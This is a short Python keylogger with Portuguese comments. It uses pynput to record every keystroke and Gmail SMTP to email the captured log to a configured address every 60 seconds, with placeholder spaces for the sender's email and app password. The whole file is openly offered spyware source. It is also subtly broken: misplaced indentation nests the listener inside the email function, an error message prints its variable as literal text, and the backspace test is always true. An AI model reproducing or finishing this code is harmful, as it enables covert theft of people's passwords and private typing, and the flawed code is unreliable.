from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#Configurações de E-Mail
Emai_origem = "seu email *"
Email_destino = "seu email 2, ou se for para testes, o mesmo do de origem! *"
Senha_email = "sua chave (Nao e a senha do email!, e a chave gerada pelo apppasswords da google)"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = Emai_origem
        msg['To'] = Email_destino
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(Emai_origem, Senha_email)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar, e")

        log = ""

    # Agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()

    def on_press(key):
        global log
        try:
            log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.enter:
                log += "\n"
            elif keyboard.Key.backspace:
                log += "[<]"
            else:
                pass # Ignorar control, shift, etc...

    # Inicia o keylogger e o envio automatico
    with keyboard.Listener(on_press=on_press) as listener:
        enviar_email()
        listener.join()